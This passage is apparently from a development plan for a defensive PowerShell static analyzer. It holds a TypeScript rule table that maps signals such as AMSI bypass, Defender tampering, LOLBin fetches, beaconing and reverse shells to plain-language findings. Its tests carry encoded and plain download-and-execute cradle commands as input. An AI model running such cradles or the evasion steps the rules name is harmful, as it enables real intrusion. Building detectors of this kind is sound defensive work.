  const decoy = CLICKFIX_DECOY_PHRASES.some((p) => ctx.lower.includes(p)) ||
    (ctx.lower.includes('--verify') && (ctx.lower.includes('press enter') || ctx.lower.includes('press win+r')))
  const headless = ctx.lower.includes('conhost') && ctx.lower.includes('--headless')
  return decoy || headless
}

// Names the cmdlet/method that actually fired download-cradle — surfaces the
// FETCH vocab hit (techniques.ts's FETCH list) as one of the 4 named methods
// (SOC must-fix #4), instead of a generic "downloads content" with no method.
function downloadMethod(ctx: BulletContext): string {
  if (ctx.lower.includes('start-bitstransfer')) return 'Start-BitsTransfer'
  if (ctx.lower.includes('downloadstring') || ctx.lower.includes('downloaddata') || ctx.lower.includes('downloadfile') || ctx.lower.includes('net.webclient')) return 'WebClient.DownloadString'
  if (ctx.lower.includes('invoke-webrequest') || ctx.lower.includes(' iwr') || ctx.lower.includes('invoke-restmethod') || ctx.lower.includes(' irm') || ctx.lower.includes('wget') || ctx.lower.includes('curl')) return 'Invoke-WebRequest'
  if (ctx.lower.includes('httpclient') || ctx.lower.includes('system.net.webrequest')) return 'raw WebRequest'
  return 'WebClient.DownloadString' // safe default — the download-cradle signal already required a FETCH hit
}

const FLAG_DESCRIPTOR: Record<string, string> = {
  '-w': 'hidden',
  '-nop': 'no-profile',
  '-ep': 'execution-policy bypass',
  '-noni': 'non-interactive',
  '-sta': 'single-threaded apartment',
}

export const RULES: ActionRule[] = [
  // ---- Delivery (tier 1, SOC must-fix #1 — was unmapped) ----
  {
    id: 'clickfix-delivery',
    requiredFacts: ['signal: clickfix', 'a real decoy/headless presentation in the corpus'],
    family: 'delivery',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'clickfix')
      if (!s) return null
      if (!isClickfixPresentation(ctx)) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Presents', text: 'Presents a fake human-verification prompt instructing the user to paste and run this command (ClickFix pattern)' }
    },
  },

  // ---- Interpreter transitions (tier 2 — reveal-nested, not "execute") ----
  {
    id: 'cmd-launches-powershell',
    requiredFacts: ['layer: cmd→powershell hop'],
    family: 'interpreter-transition',
    fires(ctx) {
      const layer = ctx.layers.find((l) => l.transform.startsWith('cmd→powershell'))
      if (!layer) return null
      const hidden = ctx.flags.some((f) => f.flag === '-w')
      return { layerIndex: layer.index, confidence: 'resolved', iocs: [], techniqueIds: ['T1059.001', 'T1059.003'], vars: { hidden: hidden ? '1' : '0' } }
    },
    render(m) {
      const text = m.vars.hidden === '1'
        ? 'Launches a PowerShell child process from cmd.exe (hidden window)'
        : 'Launches a PowerShell child process from cmd.exe'
      return { verb: 'Launches', text }
    },
  },
  {
    id: 'mshta-execute',
    requiredFacts: ['signal: mshta-interpreter'],
    family: 'interpreter-transition',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'mshta-interpreter')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: { trigger: s.trigger } }
    },
    render(m) {
      return { verb: 'Executes', text: `Executes an mshta payload (\`${m.vars.trigger}\`)` }
    },
  },
  {
    id: 'wsh-execute',
    requiredFacts: ['signal: wsh-script-exec'],
    family: 'interpreter-transition',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'wsh-script-exec')
      if (!s) return null
      const lang = s.techniqueIds.includes('T1059.005') ? 'vbs' : 'js'
      const host = ctx.interpreter === 'cscript' ? 'cscript' : 'wscript'
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: { lang, host } }
    },
    render(m) {
      return { verb: 'Runs', text: `Runs a ${m.vars.lang} script via ${m.vars.host}` }
    },
  },

  // ---- Deobfuscate/decode/decompress (tiers 3-5) ----
  {
    id: 'decode-enc',
    requiredFacts: ['layer: Base64 → UTF-16LE'],
    family: 'decode',
    fires(ctx) {
      const layer = ctx.layers.find((l) => l.transform === 'Base64 → UTF-16LE')
      if (!layer) return null
      return { layerIndex: layer.index, confidence: layer.state === 'fully-decoded' ? 'resolved' : 'opaque', iocs: [], techniqueIds: ['T1027', 'T1140'], vars: { state: layer.state } }
    },
    render(m) {
      if (m.vars.state === 'fully-decoded') {
        return { verb: 'Decodes', text: 'Decodes a Base64 `-EncodedCommand` (UTF-16LE)' }
      }
      return { verb: 'Decodes', text: 'Attempts to decode a Base64 `-EncodedCommand` — payload malformed, could not resolve' }
    },
  },
  {
    id: 'decompress-inflate',
    requiredFacts: ['layer: Base64 → inflate'],
    family: 'decompress',
    fires(ctx) {
      const layer = ctx.layers.find((l) => l.transform === 'Base64 → inflate')
      if (!layer) return null
      return { layerIndex: layer.index, confidence: 'resolved', iocs: [], techniqueIds: [], vars: {} }
    },
    render() {
      // The pipeline (fold.ts's inflate()) checks the gzip magic bytes
      // internally but doesn't surface which of gzip/raw-DEFLATE it used up
      // to report.ts's layer — naming the exact algo per D5's literal
      // "{gzip|raw-DEFLATE}" would need a small fold.ts/report.ts fact-surfacing
      // addition (D4-shaped), out of scope for this delta. Generic wording
      // until that fact exists.
      return { verb: 'Decompresses', text: 'Decompresses an embedded blob with gzip/DEFLATE in memory' }
    },
  },
  {
    id: 'decode-charcode',
    requiredFacts: ['layer: Chr()/fromCharCode → text'],
    family: 'decode',
    fires(ctx) {
      const layer = ctx.layers.find((l) => l.transform === 'Chr()/fromCharCode → text')
      if (!layer) return null
      return { layerIndex: layer.index, confidence: 'resolved', iocs: [], techniqueIds: [], vars: {} }
    },
    render() {
      return { verb: 'Decodes', text: 'Decodes Chr()/fromCharCode-encoded text' }
    },
  },

  // ---- Evade/tamper (tier 6) — one bullet per RESOLVED sub-fact (SOC must-fix #3) ----
  {
    id: 'amsi-reflection-bypass',
    requiredFacts: ['signal: amsi-reflection'],
    family: 'evade',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'amsi-reflection')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Disables', text: 'Disables AMSI (script scanning) via reflection' }
    },
  },
  {
    id: 'amsi-memory-patch-bypass',
    requiredFacts: ['signal: amsi-memory-patch'],
    family: 'evade',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'amsi-memory-patch')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Disables', text: 'Disables AMSI via an in-memory patch (`AmsiScanBuffer`)' }
    },
  },
  {
    id: 'etw-blind',
    requiredFacts: ['signal: etw-tamper'],
    family: 'evade',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'etw-tamper')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Blinds', text: 'Blinds ETW logging' }
    },
  },
  {
    id: 'defender-disable-rtm',
    requiredFacts: ['signal: defender-tamper', 'Set-MpPreference -Disable*'],
    family: 'evade',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'defender-tamper')
      if (!s) return null
      const rtm = ctx.lower.includes('disablerealtimemonitoring') || ctx.lower.includes('disableioavprotection') || ctx.lower.includes('disablebehaviormonitoring')
      if (!rtm) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Disables', text: 'Disables Microsoft Defender real-time monitoring' }
    },
  },
  {
    id: 'defender-add-exclusion',
    requiredFacts: ['signal: defender-tamper', 'Add-MpPreference -ExclusionPath'],
    family: 'evade',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'defender-tamper')
      if (!s) return null
      const excl = ctx.lower.includes('exclusionpath') || ctx.lower.includes('exclusionprocess') || ctx.lower.includes('exclusionextension')
      if (!excl) return null
      // best-effort resolved-path capture; the rule still fires (a resolved
      // sub-fact — SOME exclusion was added) even when the path itself doesn't
      // parse cleanly, degrading the render rather than the confidence tier.
      const m = ctx.text.match(/-Exclusion(?:Path|Process|Extension)\s+(['"]?)([^\s'";]+)\1/i)
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: { path: m ? m[2] : '' } }
    },
    render(m) {
      const text = m.vars.path
        ? `Adds a Microsoft Defender exclusion for **${m.vars.path}**`
        : 'Adds a Microsoft Defender exclusion — path not resolved'
      return { verb: 'Adds', text }
    },
  },
  {
    id: 'evasion-hidden-run',
    requiredFacts: ['signal: evasion-cluster'],
    family: 'evade',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'evasion-cluster')
      if (!s) return null
      const descriptors = (['-w', '-nop', '-ep', '-noni', '-sta'] as const)
        .filter((f) => ctx.flags.some((fl) => fl.flag === f))
        .map((f) => FLAG_DESCRIPTOR[f])
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: { descriptors: descriptors.join(', ') } }
    },
    render(m) {
      return { verb: 'Runs', text: `Runs ${m.vars.descriptors || 'with a clustered evasion-flag set'}` }
    },
  },

  // ---- Fetch/download (tier 7) — method named (SOC must-fix #4) ----
  {
    id: 'download-cradle-fetch',
    requiredFacts: ['signal: download-cradle'],
    family: 'fetch',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'download-cradle')
      if (!s) return null
      const hostIoc = findHostIoc(ctx.iocs)
      return {
        layerIndex: hostIoc?.layerIndex ?? 0,
        confidence: hostIoc ? 'resolved' : 'inferred',
        iocs: hostIoc ? [hostIoc.raw] : [],
        techniqueIds: s.techniqueIds,
        vars: { url: hostIoc ? hostIoc.defanged : '', method: downloadMethod(ctx) },
      }
    },
    render(m) {
      const text = m.vars.url
        ? `Downloads content from **${m.vars.url}** via \`${m.vars.method}\``
        : 'Downloads content from a URL assembled at runtime — not resolved'
      return { verb: 'Downloads', text }
    },
  },
  {
    id: 'cmd-cradle-fetch',
    requiredFacts: ['signal: cmd-cradle'],
    family: 'fetch',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'cmd-cradle')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Fetches', text: 'Fetches a command via `for /f`/finger and executes its output' }
    },
  },

  // ---- LOLBins (tier 7) — one bullet per binary+behaviour, keyed off the
  // generic `lolbin` signal's `trigger` (the matched binary name; see
  // lolbins.ts's matchLolbin, which sets trigger: e.bin). mshta/finger/conhost/
  // installutil are intentionally NOT here: mshta already has its own
  // mshta-execute rule (a duplicate would double up the reveal); finger's
  // fetch action is already covered by cmd-cradle-fetch; conhost/installutil
  // have no dedicated D5 bullet text (SOC must-fix #1 only names these 6). ----
  {
    id: 'lolbin-certutil',
    requiredFacts: ['signal: lolbin (certutil)'],
    family: 'fetch',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'lolbin' && x.trigger === 'certutil')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Decodes', text: 'Decodes/downloads a payload via `certutil`' }
    },
  },
  {
    id: 'lolbin-bitsadmin',
    requiredFacts: ['signal: lolbin (bitsadmin)'],
    family: 'fetch',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'lolbin' && x.trigger === 'bitsadmin')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Fetches', text: 'Fetches a file via `bitsadmin`/BITS transfer' }
    },
  },
  {
    id: 'lolbin-regsvr32',
    requiredFacts: ['signal: lolbin (regsvr32)'],
    family: 'fetch',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'lolbin' && x.trigger === 'regsvr32')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Registers', text: 'Registers and executes a remote script via `regsvr32` (Squiblydoo)' }
    },
  },
  {
    id: 'lolbin-rundll32',
    requiredFacts: ['signal: lolbin (rundll32)'],
    family: 'fetch',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'lolbin' && x.trigger === 'rundll32')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Executes', text: 'Executes code via `rundll32`' }
    },
  },
  {
    id: 'lolbin-msiexec',
    requiredFacts: ['signal: lolbin (msiexec)'],
    family: 'fetch',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'lolbin' && x.trigger === 'msiexec')
      if (!s) return null
      const hostIoc = findHostIoc(ctx.iocs)
      return { layerIndex: hostIoc?.layerIndex ?? 0, confidence: hostIoc ? 'resolved' : 'inferred', iocs: hostIoc ? [hostIoc.raw] : [], techniqueIds: s.techniqueIds, vars: { url: hostIoc ? hostIoc.defanged : '' } }
    },
    render(m) {
      const text = m.vars.url
        ? `Installs from a remote MSI via \`msiexec /i ${m.vars.url}\``
        : 'Installs from a remote MSI via `msiexec /i` — URL not resolved'
      return { verb: 'Installs', text }
    },
  },
  {
    id: 'lolbin-wmic',
    requiredFacts: ['signal: lolbin (wmic)'],
    family: 'fetch',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'lolbin' && x.trigger === 'wmic')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Executes', text: 'Executes via `wmic`' }
    },
  },

  // ---- Execute (tier 8) ----
  {
    id: 'download-exec-memory',
    requiredFacts: ['signal: download-cradle'],
    family: 'execute',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'download-cradle')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Executes', text: 'Executes the downloaded content in memory (not written to disk)' }
    },
  },

  // ---- Inject/load (tier 9) ----
  {
    id: 'inmemory-inject',
    requiredFacts: ['signal: fileless-loader'],
    family: 'inject',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'fileless-loader')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Allocates', text: 'Allocates executable memory and starts a thread on embedded shellcode (in-memory injection)' }
    },
  },

  // ---- Persist (tier 10) ----
  {
    id: 'creates-persistence',
    requiredFacts: ['signal: persistence'],
    family: 'persist',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'persistence')
      if (!s) return null
      let mechanism = 'a persistence mechanism'
      if (ctx.lower.includes('__eventfilter') || ctx.lower.includes('commandlineeventconsumer')) mechanism = 'a WMI event subscription'
      else if (ctx.lower.includes('schtasks') || ctx.lower.includes('register-scheduledtask')) mechanism = 'a scheduled task'
      else if (ctx.lower.includes('runonce') || ctx.lower.includes('currentversion\\run')) mechanism = 'an autostart Run-key'
      else if (ctx.lower.includes('new-service')) mechanism = 'a service'
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: { mechanism } }
    },
    render(m) {
      return { verb: 'Creates', text: `Creates ${m.vars.mechanism} (persists across reboot)` }
    },
  },

  // ---- Beacon/C2 (tier 11) ----
  {
    id: 'beacon-loop',
    requiredFacts: ['signal: beaconing'],
    family: 'beacon',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'beaconing')
      if (!s) return null
      const hostIoc = findHostIoc(ctx.iocs)
      const sleepMatch = ctx.text.match(/Start-Sleep\s+(?:-Seconds\s+)?(\d+)/i)
      return {
        layerIndex: hostIoc?.layerIndex ?? 0,
        confidence: hostIoc ? 'resolved' : 'inferred',
        iocs: hostIoc ? [hostIoc.raw] : [],
        techniqueIds: s.techniqueIds,
        vars: { host: hostIoc ? hostIoc.defanged : '', interval: sleepMatch ? sleepMatch[1] : '' },
      }
    },
    render(m) {
      const suffix = m.vars.interval ? ` every ~${m.vars.interval}s` : ''
      const text = m.vars.host
        ? `Beacons to **${m.vars.host}** in a loop${suffix}`
        : `Beacons to a runtime-resolved host in a loop${suffix} — not resolved`
      return { verb: 'Beacons', text }
    },
  },
  {
    id: 'reverse-shell-open',
    requiredFacts: ['signal: reverse-shell'],
    family: 'beacon',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'reverse-shell')
      if (!s) return null
      const hostIoc = findHostIoc(ctx.iocs)
      return {
        layerIndex: hostIoc?.layerIndex ?? 0,
        confidence: hostIoc ? 'resolved' : 'inferred',
        iocs: hostIoc ? [hostIoc.raw] : [],
        techniqueIds: s.techniqueIds,
        vars: { host: hostIoc ? hostIoc.defanged : '' },
      }
    },
    render(m) {
      const text = m.vars.host ? `Opens a reverse shell to **${m.vars.host}**` : 'Opens a reverse shell to a runtime-resolved host — not resolved'
      return { verb: 'Opens', text }
    },
  },

  // ---- WSH/HTA honesty notices — quarantined to opaque, never promoted (D3/D6) ----
  {
    id: 'wsh-not-resolved',
    requiredFacts: ['signal: wsh-decode-limits'],
    family: 'decode',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'wsh-decode-limits')
      if (!s) return null
      return { layerIndex: 0, confidence: 'opaque', iocs: [], techniqueIds: [], vars: {} }
    },
    render() {
      return { verb: 'Notes', text: 'WSH/HTA support is numeric char-code decode only — string-concatenation and Execute/eval are not resolved' }
    },
  },
  {
    id: 'wsh-concat-eval-not-resolved',
    requiredFacts: ['signal: wsh-concat-eval-present'],
    family: 'decode',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'wsh-concat-eval-present')
      if (!s) return null
      return { layerIndex: 0, confidence: 'opaque', iocs: [], techniqueIds: [], vars: {} }
    },
    render() {
      return { verb: 'Notes', text: 'String-concat / eval obfuscation present in this script — not resolved' }
    },
  },
]

/** Run every rule; assemble hits into order-numbered ActionBullets sorted by
 *  verb-family priority, then layer index (D2). Called from report.ts's
 *  analyze() right before the return, mirroring classify(buildContext(...))
 *  at report.ts:202. */
export function deriveBullets(ctx: RuleContext, layers: DecodedLayer[], iocs: ExtractedIoc[], signals: Signal[]): ActionBullet[] {
  const bctx: BulletContext = { ...ctx, layers, iocs, signals }
  const hits: { rule: ActionRule; m: Match }[] = []
  for (const rule of RULES) {
    const m = rule.fires(bctx)
    if (m) hits.push({ rule, m })
  }
  hits.sort((a, b) => {
    const pa = FAMILY_PRIORITY[a.rule.family]
    const pb = FAMILY_PRIORITY[b.rule.family]
    if (pa !== pb) return pa - pb
    return a.m.layerIndex - b.m.layerIndex
  })
  return hits.map(({ rule, m }, i) => {
    const { verb, text } = rule.render(m)
    return { order: i + 1, verb, text, confidence: m.confidence, iocs: m.iocs, techniqueIds: m.techniqueIds }
  })
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run shared/analyzer/__tests__/bullets.test.ts` then `npx vitest run shared/analyzer`
Expected: PASS. All 138 pre-existing specs stay green (nothing else imports `bullets.ts` yet).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/bullets.ts shared/analyzer/__tests__/bullets.test.ts
git commit -m "feat(analyzer): action-bullet rule table and deriveBullets"
```

---

### Task 3: Wire `deriveBullets` into `report.ts` + `composeCopyText` (D1/D4/D7)

**Files:**
- Modify: `shared/analyzer/report.ts`
- Test: `shared/analyzer/__tests__/report.test.ts` (extended)

**Interfaces:**
- Consumes: `deriveBullets` (Task 2); `resolveWithFacts` (Task 1); the existing `analyze()` body (`report.ts:102-223`), specifically the resolve loop (`report.ts:175-189`), the `corpus`/`classify`/`characterization` block (`report.ts:201-203`), the `bullets: []` return site (`report.ts:218`), and `composeCopyText` (`report.ts:297-328`) + its call site (`report.ts:209`).
- Produces: `analyze()`'s public return shape is unchanged (`AnalysisResult.bullets` is now real, not `[]`); `composeCopyText`'s signature gains a `bullets: AnalysisResult['bullets']` parameter, inserted before the existing `decodedScript` parameter.

- [ ] **Step 1: Write the failing tests**

Add to `shared/analyzer/__tests__/report.test.ts`:

```ts
describe('analyze — bullets wiring (Phase 4)', () => {
  const encCradle =
    'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='

  it('a -enc download cradle yields decode → fetch → execute bullets, in that order', async () => {
    const r = await analyze('powershell -nop -w hidden -enc ' + encCradle)
    expect(r.bullets.length).toBeGreaterThanOrEqual(3)
    expect(r.bullets[0].text).toContain('Base64 `-EncodedCommand`')
    expect(r.bullets.some((b) => b.text.includes('Downloads content from'))).toBe(true)
    expect(r.bullets.some((b) => b.text.includes('Executes the downloaded content in memory'))).toBe(true)
  })

  it('copyText includes a "What it did" section listing the confident bullets', async () => {
    const r = await analyze('powershell -nop -w hidden -enc ' + encCradle)
    expect(r.copyText).toContain('What it did:')
    expect(r.copyText).toContain('Downloads content from')
  })

  it('an -enc layer whose fetch target never resolves marks that resolve layer hadUnresolvedOperand and degrades the bullet to inferred', async () => {
    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString($u)")
    const b = r.bullets.find((x) => x.verb === 'Downloads')
    expect(b!.confidence).toBe('inferred')
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run shared/analyzer/__tests__/report.test.ts`
Expected: FAIL — `r.bullets` is still `[]` (the `bullets: []` literal at `report.ts:218`); `copyText` has no "What it did" section.

- [ ] **Step 3: Write minimal implementation**

In `shared/analyzer/report.ts`, update the imports (line 1 and line 6):

```ts
import type { AnalysisResult, Characterization, DecodedLayer, EvasionFlag, Signal } from './types'
```

```ts
import { resolveWithFacts, normalize } from './resolve'
```

```ts
import { deriveBullets } from './bullets'
```

Replace the resolve loop (`report.ts:175-189`):

```ts
  for (let depth = 0; depth < 6; depth++) {
    const { text: resolved, hadUnresolvedOperand } = resolveWithFacts(work)
    if (seen.has(resolved)) break
    seen.add(resolved)
    let idx = workIndex
    if (resolved !== normalize(work) && layers.length) {
      layers.push({
        index: layers.length,
        transform: 'resolve (fold/substitute)',
        text: resolved,
        state: 'fully-decoded',
        ...(hadUnresolvedOperand ? { hadUnresolvedOperand: true } : {}),
      })
      idx = layers.length - 1
    }
    scan.push({ index: idx, text: resolved })
    const next = iexStringTarget(resolved)
    if (!next || seen.has(next)) break
    work = next
    workIndex = idx
  }
```

Replace the block from `const signals = classify(...)` through the `return` statement (`report.ts:202-222`):

```ts
  const signals = classify(buildContext(corpus, flags, interpreter))
  const characterization = deriveCharacterization(signals)
  const bullets = deriveBullets(buildContext(corpus, flags, interpreter), layers, iocs, signals)

  const fullyDecoded = layers.filter((l) => l.state === 'fully-decoded').length
  const state = layers.length === 0 || fullyDecoded === layers.length ? 'fully-decoded' : 'partial'
  const fractionAccounted = layers.length === 0 ? 1 : fullyDecoded / layers.length
  const decodedScript = [...layers].reverse().find((l) => l.text != null)?.text ?? script
  const copyText = composeCopyText(layers, iocs, signals, characterization, bullets, decodedScript)

  return {
    input,
    flags: dedupeFlags(flags),
    layers,
    iocs,
    signals,
    characterization,
    bullets,
    confidence: { fractionAccounted, state },
    copyText,
    checkedAt: new Date().toISOString(),
  }
}
```

Update `composeCopyText` (`report.ts:297-310`) to accept and render `bullets`:

```ts
function composeCopyText(
  layers: DecodedLayer[],
  iocs: AnalysisResult['iocs'],
  signals: Signal[],
  characterization: Characterization | null,
  bullets: AnalysisResult['bullets'],
  decodedScript: string,
): string {
  const lines: string[] = ['PowerShell static analysis — STATIC analysis, script was NOT executed', '']
  if (characterization) lines.push(characterization.read, '')
  const confidentBullets = bullets.filter((b) => b.confidence !== 'opaque')
  if (confidentBullets.length) {
    lines.push('What it did:')
    confidentBullets.forEach((b) => lines.push(`  ${b.order}. [${b.confidence}] ${b.text}`))
    lines.push('')
  }
  if (signals.length) {
```

(the remainder of `composeCopyText`, from `lines.push('Behaviour signals:')` onward, is unchanged.)

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run shared/analyzer/__tests__/report.test.ts` then `npx vitest run shared/analyzer` and `tsc -b`
Expected: PASS. `report.test.ts:13`'s `expect(r.bullets).toEqual([])` for empty input stays green — no rule fires on an empty corpus/empty layers/empty signals. All other pre-existing `report.test.ts`/`characterization.test.ts` assertions are unaffected (none of them assert on `.bullets`).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/report.ts shared/analyzer/__tests__/report.test.ts
git commit -m "feat(analyzer): wire deriveBullets into analyze() and copyText"
```

---

### Task 4: `ActionBullets.tsx` UI, inserted into `AnalyzerResult.tsx` (D7)

**Files:**
- Create: `web/src/components/analyzer/ActionBullets.tsx`
- Modify: `web/src/components/analyzer/AnalyzerResult.tsx`

**Interfaces:**
- Consumes: `ActionBullet` (`@socdesk/shared/analyzer`, re-exported via `types.ts`'s barrel `export type *`); `MicroLabel` (`@socdesk/shared/ui`).
- Produces: `export function ActionBullets({ bullets }: { bullets: ActionBullet[] }): JSX.Element | null` — no other component calls it besides `AnalyzerResult.tsx`.

This task has no dedicated test file — it follows `TechniqueTally.tsx`/`DecodeLadder.tsx`/`IocTable.tsx`'s existing precedent (verified: none of the three has a `.test.tsx`). Verification is a manual/visual check via the `run` skill or `tsc -b`, consistent with the sibling components' own history.

- [ ] **Step 1: Write `ActionBullets.tsx`**

Create `web/src/components/analyzer/ActionBullets.tsx`:

```tsx
import type { ActionBullet } from '@socdesk/shared/analyzer'
import { MicroLabel } from '@socdesk/shared/ui'

// Confidence-tier marker — plain mono glyphs, not a Chip: bullets are
// sentences, not discrete tagged facts (TechniqueTally's Chip stays reserved
// for the signal tally). ● resolved, ~ inferred, ○ opaque (quarantined below).
const TIER_MARK: Record<ActionBullet['confidence'], string> = {
  resolved: '●',
  inferred: '~',
  opaque: '○',
}

/** Spec §7 / §9 — the "what did it do" breakdown. Renders resolved/inferred
 *  bullets as an execution-ordered list, then opaque (WSH/HTA honesty
 *  notices, malformed-decode notes) in a separate muted "Could not resolve"
 *  block — never promoted into the confident list (D3/D6). Reserved-colour
 *  law: plain paper/muted/faint ink only, no verdict hue — that stays
 *  TechniqueTally's characterization callout. */
export function ActionBullets({ bullets }: { bullets: ActionBullet[] }) {
  if (!bullets.length) return null
  const confident = bullets.filter((b) => b.confidence !== 'opaque').sort((a, b) => a.order - b.order)
  const opaque = bullets.filter((b) => b.confidence === 'opaque').sort((a, b) => a.order - b.order)

  return (
    <div className="flex flex-col gap-2">
      <MicroLabel tone="muted">What it did</MicroLabel>

      {confident.length > 0 && (
        <ol className="flex flex-col gap-1.5">
          {confident.map((b) => (
            <li key={b.order} className="flex flex-wrap items-start gap-2">
              <span className="font-mono text-micro text-faint">{TIER_MARK[b.confidence]}</span>
              <span className="min-w-0 flex-1 text-xs text-paper">{b.text}</span>
              {b.techniqueIds.length > 0 && (
                <span className="shrink-0 font-mono text-micro text-faint">{b.techniqueIds.join(' · ')}</span>
              )}
            </li>
          ))}
        </ol>
      )}

      {opaque.length > 0 && (
        <div className="rounded-md border border-line bg-panel-soft/40 p-3">
          <MicroLabel tone="faint">Could not resolve</MicroLabel>
          <ul className="mt-1.5 flex flex-col gap-1">
            {opaque.map((b) => (
              <li key={b.order} className="flex items-start gap-2">
                <span className="font-mono text-micro text-faint">{TIER_MARK[b.confidence]}</span>
                <span className="min-w-0 flex-1 text-xs text-muted">{b.text}</span>
              </li>
            ))}
          </ul>
        </div>
      )}
    </div>
  )
}
```

- [ ] **Step 2: Insert it into `AnalyzerResult.tsx` between `TechniqueTally` and `DecodeLadder`**

In `web/src/components/analyzer/AnalyzerResult.tsx`, add the import (alongside the existing sibling imports):

```tsx
import { ActionBullets } from './ActionBullets'
```

Insert the component between `TechniqueTally` (line 31) and `DecodeLadder` (line 32):

```tsx
      <TechniqueTally signals={result.signals} characterization={result.characterization} />
      <ActionBullets bullets={result.bullets} />
      <DecodeLadder layers={result.layers} />
```

- [ ] **Step 3: Type-check and confirm the existing analyzer suite is unaffected**

Run: `tsc -b` and `npx vitest run shared/analyzer`
Expected: clean type-check; 138 pre-existing specs plus every new spec from Task 1 (6) and Task 2 (the per-rule unit suite covering all 28 rules) still pass — the exact count is confirmed by the Task 2/Task 3 test runs. No web-side test exists to run for this task (see the no-dedicated-test-file note above).

- [ ] **Step 4: Commit**

```bash
git add web/src/components/analyzer/ActionBullets.tsx web/src/components/analyzer/AnalyzerResult.tsx
git commit -m "feat(analyzer): render the action-bullet breakdown in AnalyzerResult"
```

---

### Task 5: `bullets.test.ts` — ordering, banned-word, opaque-quarantine, coverage, end-to-end fixtures (D6, SOC-review revision)

**Files:**
- Test: `shared/analyzer/__tests__/bullets.test.ts` (extended)

**Interfaces:**
- Consumes: `analyze` (`report.ts`, Task 3's wired version) for the end-to-end fixtures; `RULES`/`deriveBullets` (Task 2), plus `RULES` from `techniques.ts` (imported aliased as `TECHNIQUE_RULES`) for the coverage test's signal-id enumeration — this task closes the discipline gates D6 names, it does not add production code.

- [ ] **Step 1: Write the failing tests**

Add to `shared/analyzer/__tests__/bullets.test.ts`:

```ts
import { analyze } from '../report'
import { RULES as TECHNIQUE_RULES } from '../techniques'

const ENC_CRADLE =
